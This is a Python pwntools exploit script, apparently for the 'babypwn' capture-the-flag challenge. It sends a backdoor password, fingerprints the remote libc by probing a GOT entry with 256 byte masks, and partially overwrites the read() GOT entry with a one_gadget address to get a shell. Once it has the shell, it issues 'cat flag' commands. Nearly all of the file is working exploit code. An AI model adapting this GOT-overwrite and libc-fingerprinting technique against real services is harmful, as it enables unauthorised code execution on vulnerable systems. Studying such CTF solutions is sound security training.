#!/usr/bin/env python

import multiprocessing
import subprocess
import pickle
import random
import tqdm
import time
import sys
import pwn #pylint:disable=import-error
import sh
import os
import re

got_offset = -0x38

def one_interaction(r, mask):
	r.send(pwn.p64(got_offset&0xffffffffffffffff).ljust(1024, '\x00'))
	r.send(chr(mask))
	f = r.readuntil('Go\n', timeout=2)
	r.unrecv(f)
	if 'Go' in f: # segfault
		#print hex(mask), "segfault:", repr(f)
		pass
	else:
		r.send('\0'*8)
	#b = time.time()
	s = re.sub("line ..: .....", "", r.readuntil('Go\n')[:-3])
	print hex(mask), "output", repr(s)
	return mask, s

def connect(host, port):
	r = pwn.remote(host, port)
	r.sendline("OOOMAKESTHESAFESTBACKDOORS")
	r.readuntil("Go\n")
	return r

def fire(r, mask):
	r.send(pwn.p64(got_offset&0xffffffffffffffff).ljust(1024, '\x00'))
	r.recv(0)
	r.send(mask)
	r.recv(0)
	if 'Go' in r.readuntil('Go', timeout=3):
		return ''
	r.sendline('cat flag /opt/ctf/babypwn/home/flag')
	r.recv(0)
	r.sendline('cat flag /opt/ctf/babypwn/home/flag')
	r.recv(0)
	r.sendline('cat flag /opt/ctf/babypwn/home/flag')
	return r.readuntil('Go')

#def run_interaction_mp(args): return run_interaction(*args)
#def make_report_mp(host, port):
#	p = multiprocessing.Pool()
#	mr = p.map_async(run_interaction_mp, [ (host, port, m) for m in range(256) ])
#	mr.wait()
#	return dict(mr.get())

def get_offset(libc):
	read_addr = int(next(s for s in str(sh.nm('-D', libc)).split('\n') if s.endswith(' read')).split()[0], 16)
	magic_addrs = map(int, str(sh.Command('one_gadget')('-r', libc)).split())

	read_bytes = pwn.p32(read_addr)
	magic_bytes = map(pwn.p32, magic_addrs)

	# find one that only differs in the first two bytes
	for m in magic_bytes:
		if m[2:] == read_bytes[2:]:
			print "Going with", m.encode('hex'), read_bytes.encode('hex')
			return m[:2]
	raise Exception('dang')

def make_report(r):
	d = { }
	for i in range(256):
		d[i] = one_interaction(r, i)[1]
		if len(d) > 40 and all(v == '' for v in d.values()):
			break
	return d

def exploit(host, port):
	r = connect(host, int(port))
	report = make_report(r)
	fingerprints = pickle.load(open('fingerprint.p'))
	correct_length = [ k for k,v in fingerprints.items() if len(str(v)) == len(str(report)) ]
	if len(correct_length) == 1:
		print "Going by length."
		libc = correct_length[0]
	else:
		libc = next(k for k,v in fingerprints.items() if v == report)
		print "Found a match!."
	o = get_offset("libs/"+libc)
	for i in range(50):
		print "."
		s = fire(r, o)
		if 'OOO' in s:
			print "FLAG:",s.strip()
			return True

def fingerprint(lib):
	port = random.randint(30000, 60000)
	print "Fingerprinting %s on port %s" % (lib, port)
	p = subprocess.Popen('cd ../deployment; socat TCP-LISTEN:%s,reuseaddr,fork exec:"./launch.sh libs/%s",stderr' % (port, lib), shell=True)
	try:
		time.sleep(1)
		with connect('localhost', port) as r:
			return make_report(r)
	finally:
		p.kill()

def fingerprint_xinetd():
	fingerprints = { }
	for lib in tqdm.tqdm(os.listdir('libs')):
		with open("/tmp/hardcoded_libc", "w") as hlc:
			hlc.write('libs/'+lib)
		with connect('localhost', 9999) as r:
			fingerprints[lib] = make_report(r)
		os.unlink("/tmp/hardcoded_libc")
	return fingerprints

def fingerprint_all():
	fingerprints = { }
	for lib in tqdm.tqdm(os.listdir('libs')):
		fingerprints[lib] = fingerprint(lib)
	return fingerprints

def fingerprint_one_mp(lib): return lib, fingerprint(lib)
def fingerprint_all_mp():
	p = multiprocessing.Pool(20)
	mr = p.map_async(fingerprint_one_mp, [ lib for lib in os.listdir('libs') ])
	mr.wait()
	return dict(mr.get())

if __name__ == '__main__':
	#print make_report(sys.argv[1], int(sys.argv[2]))
	_host = sys.argv[1]
	try:
		_port = sys.argv[2]
	except IndexError:
		_port = 31337
	while True:
		try:
			if exploit(_host, _port):
				break
		except StopIteration:
			print "NO LIBC MATCH"
